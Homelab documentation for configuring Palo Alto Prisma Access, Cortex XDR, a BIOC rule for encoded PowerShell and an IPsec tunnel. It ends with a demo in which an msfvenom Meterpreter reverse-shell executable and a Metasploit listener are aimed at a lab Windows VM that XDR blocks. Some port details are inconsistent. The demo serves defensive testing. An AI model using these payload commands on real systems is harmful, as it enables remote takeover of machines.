# Q3 Homelab Documentation
**Author:** Dee Raman  
**Last Updated:** March 2026  
**Purpose:** This document details the logical topology and step-by-step configuration for the Q3 KSO homelab. It covers Prisma Access deployment for mobile users, ADEM configuration, Cortex XDR deployment, Host Insights, Device Control, BIOC rules, site-to-site service connection via IPsec, and a simulated Kali attack demonstration.

---

## Table of Contents
1. [Lab Topology Overview](#topology)
2. [Part 1: Prisma Access License Request](#part-1)
3. [Part 2: Prisma Access Deployment (Mobile Users / GlobalProtect)](#part-2)
4. [Part 3: ADEM Configuration](#part-3)
5. [Part 4: Cortex XDR Agent Deployment](#part-4)
6. [Part 5: XDR Host Insights](#part-5)
7. [Part 6: Device Control & BIOC Rule](#part-6)
8. [Part 7: Service Connection (IPsec Tunnel to Prisma Access)](#part-7)
9. [Part 8: Kali vs. XDR Attack Simulation](#part-8)

---

## Lab Topology Overview <a name="topology"></a>

| Component | Details |
|---|---|
| Firewall | PA-VM (or PA-440) — deployed in cloud/on-prem |
| Untrust Interface | ethernet1/1 — 10.3.1.10/24 (WAN-facing) |
| Trust Interface | ethernet1/2 — 10.3.2.10/24 (LAN-facing) |
| Tunnel Interface | tunnel.2 — assigned to "vpn" security zone |
| Prisma Access Portal | dee-lab.lab.gpcloudservice.com |
| Service Connection | raman-lab (US Southeast) |
| Prisma Access Peer IP | 34.99.113.219 |
| XDR Console | https://globalseacademy.xdr.us.paloaltonetworks.com |
| Test Endpoint | Windows 11 x64 ("MisterChief") |
| Attack Machine | Kali Linux 2026.1 — 192.168.1.230 (or 192.168.103.130) |
| IKE Crypto | AES-256-CBC / SHA-256 / DH Group 20 / 8hr lifetime |

**Virtual Machines in the lab (VMware Workstation):**
- `fw` — Palo Alto PA-VM
- `pano` — Panorama (optional)
- `Windows 11 x64` — Target endpoint with XDR agent
- `buntu 64-bitu` / `Ubuntu 64-bit v2` — Linux test nodes
- `kali-linux-2026.1` — Attack machine

**Security Policy Summary (PA-VM):**

| Rule | Source Zone | Destination Zone | Source | Application | Action |
|---|---|---|---|---|---|
| ALLOW RDP FROM… | Untrust | Trust / Untrust | MY-PUBLIC-IP | any | Allow |
| ALLOW PING FROM… | Untrust | Untrust | MY-PUBLIC-IP | ping | Allow |
| ALLOW TRUST TO TRUST | Trust | Trust | any | any | Allow |
| ALLOW TRUST TO UNTRUST | Trust | Untrust | any | any | Allow |
| ALLOW UNTRUST PING | Untrust | Untrust | UNTRUST-IP | ping | Allow |
| DROP ALL | any | any | any | any | Drop |
| intrazone-default | any | (intrazone) | any | any | (default) |
| interzone-default | any | any | any | any | (default deny) |

> 📸 **Screenshot:** PA-VM Security Policy rulebase

---

## Part 1: Prisma Access License Request <a name="part-1"></a>

This part describes how to request a Prisma Access eval license in Salesforce and activate it in SCM.

### Steps

1. Navigate to the PANW SE Sandbox Salesforce tenant:  
   `https://paloaltonetworks.lightning.force.com/lightning/r/Account/0010g00001gMAxaAAG/related/Eval_Requests__r/view`

2. Click **New**

3. Fill in the following fields:

| Field | Value |
|---|---|
| Eval Type | SE Lab Kit |
| Eval Term | 365 (days) |
| SE Account | Palo Alto Networks SE Sandbox |
| CSP Account | 123456789 |

4. Click **Next**

5. Complete all remaining required fields, then submit.

6. Once the license is provisioned, log into **Strata Cloud Manager (SCM)** and activate it under your account.

---

## Part 2: Prisma Access Deployment — Mobile Users / GlobalProtect <a name="part-2"></a>

This part describes how to deploy Prisma Access for mobile users using GlobalProtect.

### Steps

1. Log into **SCM** and navigate to:  
   `Configuration > NGFW and Prisma Access`

2. Set the **Configuration Scope** to **Prisma Access**

3. Click **Enable GlobalProtect**

4. When **GlobalProtect** appears in the Overview section, select it.

---

### Infrastructure Tab

5. Under **Infrastructure Settings**, enter:

| Field | Value |
|---|---|
| Portal Hostname | dee-lab.lab.gpcloudservice.com |

6. Leave all other Infrastructure settings as default.

7. Under **Prisma Access Locations**, select:
   - US West
   - US South
   - US Northeast
   - Japan Central *(optional)*

---

### GlobalProtect App Tab

8. Select **Default** under App Settings.

9. In the App Configuration box, click **Show Advanced Options > User Behavior**

10. Configure ADEM settings:

| Setting | Value |
|---|---|
| DEM for Prisma Access | Install and User cannot Enable or Disable DEM |
| DEM for Prisma Access (GP 6.3+) | Install the Agent |

11. Click **Save**

---

### Identity Services — Local Users

12. In the top bar, navigate to **Identity Services > Local Users & Groups**

13. Click **Add Local User**

| Field | Value |
|---|---|
| Username | dee |
| Password | (your chosen password) |

14. Click **Save**

15. Click **Push Config**  
    > ⏱️ Note: This may take 1–2 attempts and up to 1–2 hours for Prisma Access to fully spin up.

---

### Connect with GlobalProtect

16. Once provisioned, navigate to:  
    `https://dee-lab.lab.gpcloudservice.com`

    > 📸 **Screenshot:** GlobalProtect Portal login page at dee-lab.lab.gpcloudservice.com, user "dee" logging in.

17. Log in with the local user credentials created above.

18. Download the **GlobalProtect agent** for your OS and install it.

19. When prompted for the portal address, enter:  
    `dee-lab.lab.gpcloudservice.com`

20. You should now be connected to Prisma Access via GlobalProtect. ✅

---

## Part 3: ADEM Configuration <a name="part-3"></a>

This part describes how to enable and configure ADEM (Autonomous Digital Experience Management) for Prisma Access mobile users.

### Steps

1. In SCM, navigate to:  
   `Insights > Application Experience`

2. Click the **settings icon** (⚙) in the top-right corner.

---

### Create an Application Suite

3. On the **Application Suites** tab, click **Create Application Suite**

4. Fill in:

| Field | Value |
|---|---|
| Name | youtube *(or your chosen name)* |

5. Click **Add Domain** and enter: `www.youtube.com`

6. Click **Save**

---

### Create an Application Test

7. On the **Application Tests** tab, click **Create Application Test**

8. Fill in:

| Field | Value |
|---|---|
| Name | youtube *(or your chosen name)* |

9. Click **Add Domain URL** and enter: `www.youtube.com`

10. Click **Save**

---

### Validate

11. Run YouTube on the endpoint for **10–20 minutes**.

12. Return to the **Application** tab in ADEM to review the collected telemetry and experience scores.

---

## Part 4: Cortex XDR Agent Deployment <a name="part-4"></a>

This part describes how to deploy the Cortex XDR endpoint agent on the Windows test machine.

### Steps

1. Navigate to the XDR console:  
   `https://globalseacademy.xdr.us.paloaltonetworks.com/dashboard`

2. Go to **Inventory > Installations**

3. Click **Create** in the top-right corner.

4. Fill in the following:

| Field | Value |
|---|---|
| Name | Dee Raman Lab |
| Platform | Windows |
| Version | 9.1.0.20483 |
| All other values | Leave as default |

5. Click **Create**

6. Right-click the newly created installation → **Agent Installation > 64-bit installer** → select the `.msi` file.

7. Deploy the `.msi` installer on the **Windows 11 x64 test machine**.

8. Open the **XDR console** on the endpoint and click **Check In Now**.

9. Wait approximately **5 minutes** — the endpoint should appear as enabled in the XDR console. ✅

---

## Part 5: Configure XDR Host Insights <a name="part-5"></a>

This part describes how to enable Host Insights on the XDR endpoint.

### Create an Agent Settings Profile

1. In XDR, navigate to:  
   `Inventory > Policy Management > Prevention > Profiles`

2. Click **Add Profile**

3. Select **Windows** → **Agent Settings** → click **Next**

4. Fill in:

| Field | Value |
|---|---|
| Name | Dee Agent Settings |
| XDR Pro Endpoints | XDR Pro Endpoints Capabilities |
| Capability | **Enabled** |

5. Click **Create**

---

### Create a Prevention Policy Rule

6. Navigate to: `Prevention > Policy Rules`

7. Click **Add Policy** and fill in:

| Field | Value |
|---|---|
| Name | Dee Lab |
| Platform | Windows |
| Agent Settings | Dee Agent Settings |
| All other settings | Leave as default |

8. Click **Next**

9. Under **Endpoint**, select: `MisterChief` (your Windows test machine)

10. Click **Next** → **Done** ✅

---

## Part 6: Configure Device Control & BIOC Rule <a name="part-6"></a>

This part describes how to configure a Device Control policy to block floppy disk access and create a custom BIOC detection rule.

---

### Device Control — Block Floppy Disk

#### Create an Extension Profile

1. Navigate to:  
   `Inventory > Policy Management > Extension > Profiles`

2. Click **Add Profile** → Select **Windows** → **Device Configuration** → **Next**

3. Fill in:

| Field | Value |
|---|---|
| Name | Dee Block Floppy |

4. Enable the **Block Floppy Disk** option.

5. Click **Create**

---

#### Create a Policy Rule

6. Navigate to: `Prevention > Policy Rules`

7. Click **Add Policy** and fill in:

| Field | Value |
|---|---|
| Name | Dee Lab Device Control |
| Platform | Windows |
| Agent Settings | Dee Block Floppy |
| All other settings | Leave as default |

8. Click **Next** → Select Endpoint: `MisterChief` → Click **Next** → **Done** ✅

---

### BIOC Rule — Detect Suspicious PowerShell Execution

> ℹ️ BIOC rules are applied globally and do **not** need to be assigned per-agent.

1. Navigate to:  
   `Threat Management > Detection Rules > BIOC`

2. Click **Add BIOC**

3. Fill in the detection condition:

| Field | Value |
|---|---|
| Select | Process |
| Name | Possible PowerShell Execution - DR |
| CMD | contains `-enc` |

4. Click **Save**

5. Fill in the rule metadata:

| Field | Value |
|---|---|
| Name | Possible PowerShell Execution - DR |
| Type | Execution |
| Severity | Low |
| MITRE Technique | T1059 - Command and Scripting Interpreter |

6. Click **OK** ✅

---

## Part 7: Service Connection — IPsec Tunnel to Prisma Access <a name="part-7"></a>

This part describes how to configure a site-to-site IPsec service connection between the PA-VM firewall and Prisma Access via SCM, and validate traffic flows through the tunnel.

---

### SCM — Create Service Connection

1. In SCM, navigate to:  
   `Configuration > NGFW and Prisma Access > Service Connections`

2. Click **Add Service Connection** and fill in:

| Field | Value |
|---|---|
| Name | raman-lab |
| Prisma Access Location | US Southeast |

3. Under **PA-G Primary Tunnel > Setup Tunnel**:

| Field | Value |
|---|---|
| Tunnel Name | dee-lab-ipsec |
| Branch Device Type | Other Devices |
| Branch Device IP Address | Dynamic |
| Pre-Shared Key | (your PSK) |

4. > ⚠️ **Commit now** to obtain the auto-generated FQDN for the service connection. Example:  
   `raman-lab.us-southeast.sc.ossj2yygyo.lab.gpcloudservice.com`

5. Continue configuring IKE settings:

| Field | Value |
|---|---|
| IKE Local Identification | FQDN (hostname) → *(SCM-generated FQDN above)* |
| IKE Peer Identification | User FQDN (email) → draman@paloaltonetworks.com |
| IKE Passive Mode | ✅ Enabled |

6. Click **IKE Advanced Options** and configure:

| Field | Value |
|---|---|
| IKE Protocol Version | IKEv2 only mode |
| Crypto Profile Name | DEE-LAB-IKE-CRYPTO |
| Encryption | aes-256-cbc |
| Authentication | sha256 |
| DH Group | group20 |
| Disable AKE | ✅ |
| IKE Lifetime | 8 hours |

7. **Click Save on every window.** ✅

---

### PA-VM — IKE Crypto Profile

8. In the PA-VM web UI, navigate to: `Network > IKE Crypto`

9. Click **Add** and fill in:

| Field | Value |
|---|---|
| Name | DEE-LAB-IKE-CRYPTO |
| DH Group | group20 |
| Authentication | sha256 |
| Encryption | aes-256-cbc |
| Timers | 8 hours |

---

### PA-VM — IPsec Crypto Profile

10. Navigate to: `Network > IPSec Crypto`

11. Click **Add** and fill in:

| Field | Value |
|---|---|
| Name | DEE-LAB-IPSEC-CRYPTO |
| IPSec Protocol | ESP |
| Encryption | aes-256-cbc |
| Authentication | sha256 |
| DH Group | group20 |
| Lifetime | 8 hours |

---

### PA-VM — IKE Gateway

12. Navigate to: `Network > IKE Gateways`

13. Click **Add** (or edit `ike-gw-prisma`) and fill in:

| Field | Value |
|---|---|
| Name | ike-gw-prisma |
| Version | IKEv2 only mode |
| Address Type | IPv4 |
| Interface | ethernet1/1 |
| Local IP Address | None |
| Peer IP Address Type | IP |
| Peer Address | 34.99.113.219 |
| Authentication | Pre-Shared Key |
| PSK | (your PSK — must match SCM) |
| Local Identification | User FQDN (email) → draman@paloaltonetworks.com |
| Peer Identification | FQDN (hostname) → raman-lab.us-southeast.sc.ossj2yygyo.lab.gpcloudservice.com |

14. Click **Advanced Options** and enable **NAT Traversal** (NAT-T).

15. Set **IKE Crypto Profile** to: `DEE-LAB-IKE-CRYPTO`

> 📸 **Screenshot:** IKE Gateway configuration on PA-VM — `ike-gw-prisma`, peer 34.99.113.219, IKEv2, PSK, User FQDN local ID.

---

### PA-VM — Tunnel Interface

16. Navigate to: `Network > Interfaces > Tunnel`

17. Click **Add** and configure:

| Field | Value |
|---|---|
| Name | tunnel.2 |
| Logical Router | vr1 (or default) |
| Security Zone | vpn *(create new if needed)* |

---

### PA-VM — IPsec Tunnel

18. Navigate to: `Network > IPSec Tunnels`

19. Configure:

| Field | Value |
|---|---|
| Name | sc-lab-raman |
| Tunnel Interface | tunnel.2 |
| Type | Auto Key |
| Address Type | IPv4 |
| IKE Gateway | ike-gw-prisma |
| IPSec Crypto Profile | DEE-LAB-IPSEC-CRYPTO |

> 📸 **Screenshot:** IPsec Tunnels page on PA-VM — `sc-lab-raman`, interface ethernet1/1, tunnel.2, peer 34.99.113.219, green "Tunnel Info" status indicator.

---

### Initiate the Tunnel from CLI

20. Connect to the PA-VM CLI and run:

```bash
test vpn ipsec-sa tunnel sc-lab-raman
```

21. Verify the tunnel comes up. Once established, you should see:

```
IKEv2 SA: ESTABLISHED ✅
  Algorithm: PSK/DH20/AES256/SHA256
  Peer: 34.99.113.219:4500 (NAT-T working ✅)
  Lifetime: 28800s (8 hours)

IPsec SA: Mature ✅
  SPI in/out: DFA20C73 / 9456040E
```

> 📸 **Screenshot:** CLI output showing IKEv2 SA ESTABLISHED, PSK/DH20/AES256/SHA256, peer 34.99.113.219:4500, IPsec SA Mature — March 27 at 11:19:49.

> 📸 **Screenshot:** SCM Service Connections page showing `raman-lab` with Tunnel **OK** ✅ and Config **In Sync** ✅.

---

### Validate: Ping Through the Tunnel

22. From a **Prisma Access-connected device** (GlobalProtect user), ping the Windows VM on the branch network:

```
Target: 10.3.2.20 (Windows 11 x64 on Trust network)
```

Expected result:
```
64 bytes from 10.3.2.20: icmp_seq=1 ttl=128 time=1.43ms ✅
64 bytes from 10.3.2.20: icmp_seq=2 ttl=128 time=0.99ms ✅
64 bytes from 10.3.2.20: icmp_seq=3 ttl=128 time=1.99ms ✅
24/24 packets replied — 0% packet loss ✅
```

> ⏱️ **Note:** SCM can be buggy — be patient. Some commits and tunnel negotiations may require multiple attempts.

---

## Part 8: Kali vs. XDR Attack Simulation <a name="part-8"></a>

This part demonstrates a simulated attacker using Metasploit/Kali Linux to craft a malicious executable, host it via HTTP, download it on the Windows endpoint, and have Cortex XDR detect and block it.

---

### Deploy Kali Linux

1. Deploy the Kali Linux VM (tested with **Kali 2026.1**) in VMware Workstation.
   - Kali VM IP: `192.168.1.230` (or `192.168.103.130` depending on your network)

---

### Create the Malicious Payload

2. Open a terminal in Kali and run:

```bash
cd ~/Desktop

msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.230 \
  LPORT=80 \
  -f exe \
  -o malware.exe
```

This creates a **Meterpreter reverse TCP payload** in `.exe` format targeting the lab Windows machine.

3. Host the file via a simple HTTP server:

```bash
python3 -m http.server 80
```

---

### Set Up the Metasploit Listener

4. In a second terminal on Kali, open Metasploit and configure the handler:

```bash
msfconsole -q -x "use exploit/multi/handler; \
  set payload windows/x64/meterpreter/reverse_tcp; \
  set LHOST 192.168.1.230; \
  set LPORT 80; \
  run"
```

> 📸 **Screenshot:** Kali terminal in VMware Workstation running msfconsole — `multi/handler` configured, LHOST 192.168.1.230, LPORT 4444, waiting for connection.

---

### Download the Payload on the Windows Endpoint

5. On the **Windows 11 x64 test machine** (MisterChief), open a browser and navigate to:

```
http://192.168.1.230/malware.exe
```

> 📸 **Screenshot:** Browser at `192.168.1.230:8080` showing directory listing — `malware.exe` visible in the file list alongside `.msf4/` Metasploit directory, confirming the Kali HTTP server is running.

6. Download and attempt to open `malware.exe`.

---

### Cortex XDR Blocks the Execution

7. When `malware.exe` is executed (or even on download depending on policy), **Cortex XDR should immediately block it** and display a prevention alert:

```
◆ Cortex XDR Prevention Alert

Cortex XDR has blocked a malicious activity!

Application name:        malware.exe
Application publisher:   Unknown
Prevention description:  Suspicious executable detected

Please contact your help desk for questions or additional information.
```

> 📸 **Screenshot:** Cortex XDR Prevention Alert dialog — "Cortex XDR has blocked a malicious activity!" — `malware.exe`, Publisher: Unknown, Suspicious executable detected.

---

### Verify in XDR Console

8. Open the **XDR console** on the PC:  
   `https://globalseacademy.xdr.us.paloaltonetworks.com`

9. Navigate to the **Incidents** or **Alerts** section and verify the blocked execution is logged with:
   - Alert type: Malware/Suspicious Executable
   - Endpoint: MisterChief
   - File: `malware.exe`
   - Action: **Prevented** ✅

---

## Summary

| Component | Status |
|---|---|
| Prisma Access License Requested | ✅ |
| GlobalProtect Mobile Users Deployed | ✅ |
| ADEM Configured | ✅ |
| Cortex XDR Agent Deployed | ✅ |
| Host Insights Enabled | ✅ |
| Device Control (Block Floppy) | ✅ |
| BIOC Rule (PowerShell -enc) | ✅ |
| Service Connection (IPsec Tunnel) | ✅ |
| Ping Validated Through Tunnel | ✅ |
| Kali Attack Simulated & Blocked by XDR | ✅ |

---

*Documentation written for Q3 KSO homelab — Dee Raman, March 2026.*
